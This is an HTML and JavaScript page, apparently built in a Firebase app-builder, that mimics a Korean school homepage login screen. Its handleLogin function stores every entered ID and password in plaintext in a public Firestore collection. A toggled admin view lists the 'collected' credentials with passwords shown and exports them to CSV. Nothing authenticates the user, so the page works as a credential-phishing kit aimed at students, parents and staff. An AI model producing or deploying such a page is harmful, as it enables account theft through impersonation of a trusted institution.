<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>학교홈페이지 로그인 & 서버 관리</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { getFirestore, doc, setDoc, getDoc, collection, getDocs, deleteDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        const firebaseConfig = JSON.parse(__firebase_config);
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'school-login-app';
        
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        let currentUser = null;

        // 초기 인증 설정 (Rule 3 준수)
        const initAuth = async () => {
            try {
                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
                    await signInWithCustomToken(auth, __initial_auth_token);
                } else {
                    await signInAnonymously(auth);
                }
            } catch (error) {
                console.error("인증 오류:", error);
            }
        };

        onAuthStateChanged(auth, (user) => {
            currentUser = user;
            if (user) {
                console.log("로그인됨:", user.uid);
                // 관리자라면 데이터를 바로 불러올 수 있게 준비
                if (window.isAdminMode) fetchServerData();
            }
        });

        initAuth();

        // --- 로그인 처리 (사용자 데이터 저장) ---
        window.handleLogin = async () => {
            if (!currentUser) {
                showToast("서버 연결 중입니다...");
                return;
            }

            const id = document.getElementById('userId').value.trim();
            const pw = document.getElementById('userPw').value.trim();

            if (!id || !pw) {
                showToast('아이디와 비밀번호를 모두 입력해주세요.');
                return;
            }

            setLoading(true);

            try {
                // Rule 1: 지정된 경로에 유저 정보 저장
                const userRef = doc(db, 'artifacts', appId, 'public', 'data', 'users', id);
                await setDoc(userRef, {
                    username: id,
                    password: pw,
                    savedAt: serverTimestamp(),
                    ip_hint: "client_access"
                });

                showToast('서버에 정보가 성공적으로 기록되었습니다.');
                // 입력창 초기화
                document.getElementById('userId').value = '';
                document.getElementById('userPw').value = '';
            } catch (error) {
                console.error("데이터 저장 실패:", error);
                showToast('서버 저장 중 오류가 발생했습니다.');
            } finally {
                setLoading(false);
            }
        };

        // --- 관리자 기능 (서버 정보 확인 및 내 컴퓨터로 가져오기) ---
        window.fetchServerData = async () => {
            if (!currentUser) return;
            
            const listContainer = document.getElementById('userList');
            listContainer.innerHTML = '<tr><td colspan="4" class="p-4 text-center">데이터를 불러오는 중...</td></tr>';

            try {
                // Rule 1 & 2: 전체 컬렉션 호출 후 메모리에서 처리
                const querySnapshot = await getDocs(collection(db, 'artifacts', appId, 'public', 'data', 'users'));
                const users = [];
                querySnapshot.forEach((doc) => {
                    users.push({ id: doc.id, ...doc.data() });
                });

                if (users.length === 0) {
                    listContainer.innerHTML = '<tr><td colspan="4" class="p-4 text-center">저장된 정보가 없습니다.</td></tr>';
                    return;
                }

                listContainer.innerHTML = '';
                users.forEach((user, index) => {
                    const date = user.savedAt ? new Date(user.savedAt.seconds * 1000).toLocaleString() : '-';
                    const row = `
                        <tr class="border-b hover:bg-gray-50">
                            <td class="p-3 text-center">${index + 1}</td>
                            <td class="p-3 font-bold text-blue-700">${user.username}</td>
                            <td class="p-3 font-mono text-red-600">${user.password}</td>
                            <td class="p-3 text-sm text-gray-500 text-center">
                                ${date}
                                <button onclick="deleteUser('${user.id}')" class="ml-4 text-red-400 hover:text-red-700">삭제</button>
                            </td>
                        </tr>
                    `;
                    listContainer.innerHTML += row;
                });

                window.cachedUsers = users; // 다운로드를 위해 캐싱
            } catch (error) {
                console.error("데이터 불러오기 실패:", error);
                showToast('데이터를 가져오지 못했습니다.');
            }
        };

        window.deleteUser = async (docId) => {
            if (!confirm('이 정보를 서버에서 삭제하시겠습니까?')) return;
            try {
                await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'users', docId));
                showToast('삭제되었습니다.');
                fetchServerData();
            } catch (error) {
                showToast('삭제 실패');
            }
        };

        window.downloadCSV = () => {
            if (!window.cachedUsers || window.cachedUsers.length === 0) {
                showToast('저장된 데이터가 없습니다.');
                return;
            }

            let csvContent = "data:text/csv;charset=utf-8,번호,아이디,비밀번호,저장시간\n";
            window.cachedUsers.forEach((u, i) => {
                const date = u.savedAt ? new Date(u.savedAt.seconds * 1000).toLocaleString() : '-';
                csvContent += `${i+1},${u.username},${u.password},${date}\n`;
            });

            const encodedUri = encodeURI(csvContent);
            const link = document.createElement("a");
            link.setAttribute("href", encodedUri);
            link.setAttribute("download", "server_login_data.csv");
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        };

        window.toggleAdmin = () => {
            const loginView = document.getElementById('loginView');
            const adminView = document.getElementById('adminView');
            window.isAdminMode = !window.isAdminMode;

            if (window.isAdminMode) {
                loginView.classList.add('hidden');
                adminView.classList.remove('hidden');
                fetchServerData();
            } else {
                loginView.classList.remove('hidden');
                adminView.classList.add('hidden');
            }
        };

        window.showToast = (text) => {
            const toast = document.getElementById('toast');
            toast.innerText = text;
            toast.style.display = 'block';
            setTimeout(() => { toast.style.display = 'none'; }, 3000);
        };

        function setLoading(isLoading) {
            const btn = document.getElementById('loginBtn');
            if (btn) {
                btn.disabled = isLoading;
                btn.innerText = isLoading ? '처리중' : '로그인';
            }
        }
    </script>

    <style>
        body { font-family: 'Malgun Gothic', 'dotum', sans-serif; }
        .notice-box { background-color: #f8f8f8; border: 1px solid #e1e1e1; padding: 22px 35px; margin-bottom: 30px; line-height: 1.7; font-size: 14px; }
        .login-wrapper { display: flex; border: 1px solid #d9d9d9; max-width: 900px; margin: 0 auto; min-height: 280px; }
        .signup-area { background-color: #006eb6; color: white; width: 42%; display: flex; align-items: center; justify-content: center; padding: 20px; text-align: center; font-weight: 600; font-size: 19px; cursor: pointer; }
        .login-area { width: 58%; padding: 35px 45px; background-color: #fff; display: flex; flex-direction: column; justify-content: center; }
        .input-box { flex: 1; height: 36px; border: 1px solid #ccc; padding: 0 10px; font-size: 14px; }
        .btn-login { background-color: #006eb6; color: white; width: 110px; height: 80px; border: none; margin-left: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
        #toast { display: none; position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: rgba(0, 0, 0, 0.8); color: white; padding: 12px 24px; border-radius: 4px; z-index: 9999; }
        .admin-header { background: #333; color: white; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; }
    </style>
</head>
<body class="bg-gray-50 min-h-screen">

    <div id="toast"></div>

    <!-- 관리자용 상단 바 (토글 버튼) -->
    <div class="admin-header shadow-md">
        <span class="font-bold text-sm">시스템 서버 관리 모드</span>
        <button onclick="toggleAdmin()" class="bg-white text-black px-4 py-1 rounded text-xs font-bold hover:bg-gray-200">
            화면 전환 (사용자/관리자)
        </button>
    </div>

    <!-- [1] 사용자 로그인 화면 (이미지 디자인 재현) -->
    <div id="loginView" class="p-6 md:p-12">
        <div class="max-w-[900px] mx-auto bg-white p-2">
            <div class="border-b-[3px] border-black mb-8">
                <h1 class="text-[32px] font-bold pb-5 text-[#222]">로그인</h1>
            </div>

            <div class="notice-box">
                <p>
                    학교홈페이지에 가입된 아이디는 교육청에서 제공하는 해당 학교홈페이지에서만 사용이 가능하며 
                    <span class="text-[#e60012] font-bold">(상급학교진학/전학/전출 시)</span> 
                    <span class="font-bold text-black">기존의 아이디는 회원탈퇴 한 후 다른 학교에서 새롭게 회원가입을 진행하셔야 합니다.</span>
                </p>
            </div>

            <div class="login-wrapper">
                <div class="signup-area" onclick="showToast('회원가입은 준비 중입니다.')">
                    학교홈페이지 회원가입
                </div>
                <div class="login-area">
                    <p class="text-[14px] mb-6">본 학교홈페이지에 회원 가입이 되어 있으면 <span class="text-[#0050a0] font-bold">기존 아이디를 사용하시면 됩니다.</span></p>
                    <div class="flex">
                        <div class="flex-1 space-y-2">
                            <div class="flex items-center"><span class="w-20 text-xs font-bold">아이디</span><input type="text" id="userId" class="input-box w-full"></div>
                            <div class="flex items-center"><span class="w-20 text-xs font-bold">비밀번호</span><input type="password" id="userPw" class="input-box w-full"></div>
                        </div>
                        <button id="loginBtn" class="btn-login" onclick="handleLogin()">로그인</button>
                    </div>
                    <div class="mt-6 pt-4 border-t flex justify-center gap-4 text-xs text-gray-500">
                        <a href="#">아이디 찾기</a><span>|</span><a href="#">비밀번호 찾기</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- [2] 서버 관리자 화면 (데이터 리스트) -->
    <div id="adminView" class="hidden p-6 max-w-[1000px] mx-auto">
        <div class="bg-white rounded-lg shadow-xl overflow-hidden">
            <div class="p-6 border-b flex justify-between items-center bg-gray-100">
                <h2 class="text-xl font-bold text-gray-800">수집된 서버 데이터 (로그인 정보)</h2>
                <div class="space-x-2">
                    <button onclick="fetchServerData()" class="bg-blue-600 text-white px-4 py-2 rounded text-sm font-bold">새로고침</button>
                    <button onclick="downloadCSV()" class="bg-green-600 text-white px-4 py-2 rounded text-sm font-bold">내 컴퓨터로 저장 (CSV)</button>
                </div>
            </div>
            <div class="overflow-x-auto">
                <table class="w-full text-left">
                    <thead class="bg-gray-200 text-xs uppercase text-gray-600">
                        <tr>
                            <th class="p-3 text-center w-16">번호</th>
                            <th class="p-3">아이디(ID)</th>
                            <th class="p-3">비밀번호(PW)</th>
                            <th class="p-3 text-center">수집 시간 / 관리</th>
                        </tr>
                    </thead>
                    <tbody id="userList" class="text-sm">
                        <!-- 데이터 로딩 영역 -->
                    </tbody>
                </table>
            </div>
        </div>
        <p class="mt-4 text-gray-500 text-xs text-center">이 대시보드는 Firestore 실시간 서버 데이터를 직접 조회합니다.</p>
    </div>

    <script>
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !window.isAdminMode) {
                window.handleLogin();
            }
        });
    </script>
</body>
</html>
